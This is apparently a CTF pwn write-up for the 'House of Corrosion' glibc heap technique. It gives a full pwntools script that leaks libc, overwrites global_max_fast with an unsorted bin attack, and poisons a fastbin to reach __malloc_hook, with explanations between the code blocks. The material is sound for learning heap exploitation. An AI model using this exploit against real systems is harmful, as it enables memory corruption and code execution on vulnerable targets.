---
title: "House of Corrosion — Exploiting global_max_fast for Large-Scale Out-of-Bounds Fastbin Writes"
ctf: "heap"
category: "pwn"
difficulty: "easy"
points: null
date: "2026-07-02"
lat: -300
lng: 702
summary: "Overwriting global_max_fast via an unsorted bin attack to treat large chunks as fastbins, enabling massive out-of-bounds indexing into libc structures like stdout, stderr, or various hooks."
tags:
  - "heap"
  - "unsortedbin"
  - "fastbin"
  - "global_max_fast"
  - "house-of-corrosion"
  - "glibc"
---

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_corrosion")
libc = ELF("./libc-2.27.so")

context.binary = exe
context.arch = "amd64"

def conn():
    if args.LOCAL:
            r = process([exe.path])
    elif args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)
    return r

count = -1

def malloc(idx, size):
    global count
    r.sendlineafter(b"> ", b"1")
    r.sendlineafter(b"63): ", str(idx).encode())
    r.sendlineafter(b"3b00): ", str(size).encode())
    r.recvuntil(b"addr: ")
    count +=1
    return int(r.recvline().strip(), 16),count


def free(idx):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"63): ", str(idx).encode())


def edit(idx, off, data):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"63): ", str(idx).encode())
    r.sendlineafter(b"Offset: ", str(off).encode())
    r.sendlineafter(b"Length: ", str(len(data)).encode())
    r.sendafter(b"Data: ", data)

def show(idx,off,ln):
    r.sendlineafter(b"> ",b"4")
    r.sendlineafter(b"63): ",str(idx).encode())
    r.sendlineafter(b"Offset: ",str(off).encode())
    r.sendlineafter(b"Length: ",str(ln).encode())
    return u64(r.recv(8))

def main():
    global r
    r = conn()
```

    Okay, in this technique, we will learn how to translate unsorted bin chunks into 
    fastbin chunks. Since we have an allocation size limitation restricting us to sizes 
    greater than 0x420, we will first perform an unsorted bin attack to overwrite the 
    global_max_fast variable. 

    Once global_max_fast is overwritten, the allocator will treat our large allocations 
    as fastbin chunks. While we could pull this off without a leak by using a 4-bit ASLR 
    brute-force, the challenge includes a show function. Because of that, we will use a 
    leak to make the exploit much more reliable. So, let's do it!

```python    
    chunkA = malloc(0,0x420)
    guard  = malloc(1,0x18)

    free(chunkA[1])
    heap = int(chunkA[0]) >> 12 << 12

    lib = show(chunkA[1],0,8) - 0x203b20
    libc.address = lib

    global_max_fast = lib + 0x205000 + 0x51a0
    log.success(f"LEAK:\nheap:{hex(heap)}\nlibc:{hex(lib)}\nglobal:{hex(global_max_fast)}\n")
```
    Now, we are performing an unsorted bin attack. When a chunk is unlinked from the 
    unsorted bin, the allocator executes the following operations:

    bck = victim->bk;
    bck->fd = victim;

    We can write a large libc address into our global variable by setting victim->bk to 
    target_address - 0x10. When the second macro line executes:

    (target_address - 0x10) + 0x10 = victim;

    This writes the address of our victim chunk directly into global_max_fast, 
    effectively changing its maximum size threshold to a massive integer value.

```python
    edit(chunkA[1],0x8,p64(global_max_fast-0x10))
    chunkA = malloc(2,0x420)
```

    Okay, now we can allocate chunkB as a fastbin chunk, even with a size greater than 
    0x420. After that, we can make its fd pointer point directly to __malloc_hook, a 
    standard file stream like stdout, or whatever target we want.
```python
    chunkB = malloc(3,0x440)
    guard  = malloc(4,0x18)

    free(chunkB[1])
    edit(chunkB[1],0,p64(libc.symbols['__malloc_hook']))

    chunkB = malloc(5,0x440)

    target = malloc(6,0x440)
```

    At this point, we get our target chunk back from malloc, and the attack is 
    successfully completed!
```python
    r.interactive()

if __name__ == "__main__":
    main()
```